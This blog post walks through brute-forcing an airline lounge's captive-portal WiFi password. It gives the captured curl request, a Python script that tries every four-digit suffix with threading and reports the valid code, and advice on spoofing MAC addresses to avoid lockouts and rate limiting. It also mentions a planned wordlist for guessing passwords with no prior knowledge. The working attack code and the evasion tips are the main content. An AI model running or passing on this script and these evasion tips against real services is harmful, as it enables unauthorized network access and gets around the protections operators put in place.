---
title: "Bruteforcing an airline lounge's WiFi password"
date: 2018-10-09 16:21:49
header-img: "/images/airline-pass.png"
---
<link rel="stylesheet" href="/stylesheets/main.css"/>

I'm a frequent traveler and stay in lounges fairly often (shoutout [/r/churning](https://reddit.com/r/churning)!). Most lounges don't use traditional [WiFi Authentication](https://tools.ietf.org/html/rfc4764) - instead they rely on some form of captive gate. This allows them to provide user content, collect a more information on the users of the service, and rotate the password easily.

This is how one could *theoretically* brute force an easily enumerable captive portal password. This is a genericized article that does **not name any airline in particular**.

Let's suppose I had been traveling
Most lounges follow a very similar password schema on a day to day basis. A common one is of the format `WORLDWIDE####`, with a random last 4 digits. This only creates 10,000 unique possible passwords, which is a fairly small search space. Although I had the password in front of me but I wanted to see if I could figure it out using other means.

## Intercepting Network Requests

Chrome trivializes intercepting network requests. Normally I'd man-in-the-middle myself using Burp Suite or Charle's Proxy, but since this was just a site we can use the built in devtools network tab. 

Once submitting a random password the route shows up in devtools.

<img src="/images/airline-network.png">
<p class="footnote">The airline's password attempt route</p>

It looks like it'll return a `302` status if the password is incorrect and (I assumed) a `2XX` when it's correct. Devtools has a handy "Copy as Curl" function that allows you to copy any network request as a curl request just by right-clicking on it. 

<img src="/images/copyascurl.png">
<p class="footnote">Devtools Copy as Curl functionality</p>

```bash
curl 'https://anairline.com/auth/index.html/u' \
-H 'Connection: keep-alive' \
-H 'Pragma: no-cache' \
-H 'Cache-Control: no-cache' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'DNT: 1' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.45 Safari/537.36' \
-H 'Sec-Metadata: cause="user-activated", destination="document", site="same-origin"' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' \
-H 'Referer: https://anairline.com/login.html?errmsg=Authentication%20failed' \
-H 'Accept-Encoding: gzip, deflate, br' \
-H 'Accept-Language: en-US,en;q=0.9,it;q=0.8' \
-H 'Cookie: newHP=true; Locale=POS=US&Lang=en&UMID=6992bfc2-1acf-448e-8b3f-93f38d92a944&POSCODE=L; SearchInput={"Origin":"YYZ","Destination":"WAS","Trips":null,"DepartDate":"Oct 05, 2018","ReturnDate":"Oct 08, 2018","searchTypeMain":"roundTrip","realSearchTypeMain":"roundTrip","awardTravel":"False","cabinType":"econ","awardCabinType":"awardEcon","numOfAdults":"1","numOfSeniors":"0","numOfChildren04":"0","numOfChildren03":"0","numOfChildren02":"0","numOfChildren01":"0","numOfInfants":"0","numOfLapInfants":"0","numberOfTravelers":"1","isFlexible":false,"FlexibleDays":3,"FlexibleDate":"Oct 05, 2018","isNonStop":false};  D3Name=; D3Locator=; CPsession=http%253A%252F%252Fcaptive%252Eapple%252Ecom%252Fhotspot%2Ddetect%252Ehtml%26ip%3D172%2E26%2E15%2E169' \
--data 'user=GLOBAL1111&password=NULL&cmd=authenticate&Login=Sign+in' \
--compressed -v
```
<p class="footnote">Note: Session and User IDs removed</p>

Now that I had the curl request I could play around with the state and paremeters. It looks like the form is actually encoding the password as the username and the password as NULL.

As a sidenote, this **probably** means that any built in password bruteforcing checks with the library they're using *won't* work because we aren't trying the same username with a different password over and over again - we are just iterating over different usernames with the same password. I can't be sure of this but it 

Shell scripting is fine in a pinch but I wanted something more robust. There's a neat utility that'll convert a curl request to Python/Node/PHP [here](https://curl.trillworks.com). Now that I had python code that had valid state I could quickly iterate over all combinations.

```python
import requests

cookies = {
    'newHP': 'true',
    'Locale': 'POS=US&Lang=en&UMID=6992bfc2-1acf-448e-8b3f-93f38d92a944&POSCODE=L',
    'SearchInput': '{"Origin":"YYZ","Destination":"WAS","Trips":null,"DepartDate":"Oct 05, 2018","ReturnDate":"Oct 08, 2018","searchTypeMain":"roundTrip","realSearchTypeMain":"roundTrip","awardTravel":"False","cabinType":"econ","awardCabinType":"awardEcon","numOfAdults":"1","numOfSeniors":"0","numOfChildren04":"0","numOfChildren03":"0","numOfChildren02":"0","numOfChildren01":"0","numOfInfants":"0","numOfLapInfants":"0","numberOfTravelers":"1","isFlexible":false,"FlexibleDays":3,"FlexibleDate":"Oct 05, 2018","isNonStop":false}',
    'D3Name': '',
    'D3Locator': '',
    'CPsession': 'http%253A%252F%252Fcaptive%252Eapple%252Ecom%252Fhotspot%2Ddetect%252Ehtml%26ip%3D172%2E26%2E15%2E169',
}

headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.45 Safari/537.36',
    'Sec-Metadata': 'cause="user-activated", destination="document", site="same-origin"',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Referer': 'https://anairline.com/login.html?errmsg=Authentication%20failed',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9,it;q=0.8',
}

data = {
  'user': 'GLOBAL1111',
  'password': 'NULL',
  'cmd': 'authenticate',
  'Login': 'Sign in'
}

response = requests.post('https://anairline.com/auth/index.html/u', headers=headers, cookies=cookies, data=data)

```

## Bruteforcing the login

Running the python above returns the exact same as the network request - a `302` redirect, indicating the passphrase was not correct.

I could write a quick wrapper to the request such that it would try all combinations 0000 to 9999.

```python
for i in range(10000):
	attempt = "%04d" % i # h/t /u/paulschreiber
	data = {
	  'user': 'WORLDWIDE' + attempt,
	  'password': 'NULL',
	  'cmd': 'authenticate',
	  'Login': 'Sign in'
	}
	response = requests.post('https://anairline.com/auth/index.html/u', headers=headers, cookies=cookies, data=data)
	if response.status_code != 302:
		print('Valid passphrase found: WORLDWIDE%s' % attempt)
```

Unfortunately this was pretty slow - it would serialize the attempts, which would not allow an attempt to be made until the previous network request had returned. A little threading magic (and ratelimiting) and we'd be on our way.

```python
import threading 
import time

def brute_force_pass(attempt):
	data = {
	  'user': 'WORLDWIDE' + attempt,
	  'password': 'NULL',
	  'cmd': 'authenticate',
	  'Login': 'Sign in'
	}
	response = requests.post('https://anairline.com/auth/index.html/u', headers=headers, cookies=cookies, data=data)
	if response.status_code != 302:
		print('Valid passphrase found: WORLDWIDE%s' % attempt)

for i in range(10000):
	attempt = "%04d" % i # h/t /u/paulschreiber
	threading.Thread(target=brute_force_pass, args=[attempt]).start()
	time.sleep(0.05) # sleep for 1/20th of a second so we don't start timing out or running out of sockets
```

Fortunately the captive portal is running locally so the RTT is pretty low, which means that the server replies fairly quickly. At `0.05` seconds (plus overhead) per request we should be able to try the entire search space in just over 8 minutes. 

I left to go grab a rum and coke and by the time I came back it had finished.

<img src="/images/airline-pass.png">
<p class="footnote">The daily password for that airline password</p>

And there you have it! Today's WiFi password is `WORLDWIDE9980`.

The best part about it was that the valid attempt automatically whitelisted that mac address - I didn't even need to type the password in myself.

## Preventing brute force attacks

I was worried I'd run into ratelimiting or start getting `429`'s from the airline. Fortunately that never happend, but I've run into similar services that will lock you out. A good way around this is to spoof your mac address - at that point, there is no way for a router to recognize that it's your device that has made all these attempts, and will allow you to keep doing so uninhibited. 

As an aside spoofing your mac address on the 2018 MacBook Pro's seems to not work any more, so if anyone knows how to do it I'd be very grateful (`sudo ifconfig en0 ether aa:bb:cc:dd:ee:ff` no longer works).

## Conclusions

This also would've been possible to do with BurpSuite and setting up Intruder, but I didn't really want to go to that effort. This was a quick exercise in seeing how easy this would be if I was standing *outside* the lounge, without access to the password. Any online service that uses a captive portal is susceptible to this attack. One of these days I'm planning on building an airport-centric wordlist (i.e. Lounge, WiFi, &lt;airport name&gt;, &lt;airline name&gt;, current year, etc.) so that bruteforcing *without* any preexisting knowledge also becomes feasible.

Overall fairly successful for 10 minutes of work!

Comments can be found on reddit, [here]()